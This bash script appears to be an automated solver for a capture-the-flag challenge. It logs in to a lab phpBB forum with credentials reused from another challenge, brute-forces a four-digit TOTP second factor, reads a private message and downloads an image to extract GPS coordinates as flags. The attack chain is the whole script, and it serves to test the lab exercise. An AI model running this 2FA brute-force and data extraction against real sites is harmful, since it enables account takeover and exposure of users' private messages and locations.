#!/bin/bash

apt-get update && apt-get install -y exiftool >/dev/null

submit_flag() {
    local task_id=$1
    local flag=$2

    RES=$(curl -s 'http://172.20.0.3/api/challenges/submit' \
        -X POST \
        -H 'Content-Type: application/json' \
        --data-binary '{"challenge_id": "by-the-pool", "task_id": "'"$task_id"'", "flag": "'"$flag"'"}')

    if [[ $RES != *"Congratulations"* ]]; then
        echo "Failed to submit flag for $task_id - $RES"
        exit 2
    fi
    echo "Flag submitted for $task_id"
}

# we know that 172.20.0.249 is the dns server, let's assume we don't know the webserver ip
target=$(dig bread.forum @172.20.0.249 +short | grep 1)

d=$(date +"%s")
sid=$(curl "$target" 2>/dev/null | grep delete_cookies | sed -r 's/.*sid=([^"]*)".*/\1/g')

# we know the credentials from corporate-retreat
curl -s "http://$target/ucp.php?mode=login" -d "username=Vigilante88&password=M1r0{mayFXwawow1ezzUjVIOutDhKRcZGJblvzDOgBaA4EMmQG09UpfP8i3XQA4YY}&sid=$sid&login=Login&creation_time=$d&form_token=ffform-tokennn" | grep OTP >/dev/null

for i in $(seq 0 10000); do
	totp=$(printf "%04d" "$i")
	resp=$(curl -s "http://$target/app.php/paul999/tfa/save/59/0/0/1/otp/?sid=$sid" --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.7' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H "Referer: http://$target/ucp.php?mode=login&sid=$sid" -H 'Content-Type: application/x-www-form-urlencoded' -H "Origin: http://$target" -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Priority: u=0, i' --data-raw 'creation_time='"$d"'&form_token=292e5edd2b5e3d2bd7ec6ee9b23f1b3013e0d190&sid='"$sid"'&random=7c8330dd5a0038d866540aa7bb8eacee1d0aa893&redirect=index.php&authenticate='"$totp")
	echo "$resp" | grep 'incorrect' >/dev/null
	if [ $? -eq 1 ]; then
		echo "totp found: $totp" >&2
		break
	fi
done

if (( i == 10000 )); then
  echo "totp not found :(" >&2
  exit 1
fi

ext=$(curl -s -L "http://$target/app.php/paul999/tfa/save/59/0/0/1/otp/?sid=$sid" -d "creation_time=$d&form_token=ffform-tokennn&sid=$sid&random=not-random&redirect=index.php&authenticate=$totp&redirect=ucp.php%3Fi%3Dpm%26mode%3Dview%26f%3D0%26p%3D17" | grep '"tool.' | head -1 | awk -F ' "tool.' '{print $2}' | awk -F '" to' '{print $1}')
submit_flag "tool" "$ext"

curl -s -L "http://$target/app.php/paul999/tfa/save/59/0/0/1/otp/?sid=$sid" -d "creation_time=$d&form_token=ffform-tokennn&sid=$sid&random=not-random&redirect=index.php&authenticate=$totp&redirect=download%2Ffile.php%3Fid%3D3" --output image
lat=$(printf "%.3f\n" "$(exiftool -n -GPSLatitude image -s -s -s)")
lon=$(printf "%.3f\n" "$(exiftool -n -GPSLongitude image -s -s -s)")
submit_flag "location" "$lat,$lon"

rm image

echo "OK - tests passed"
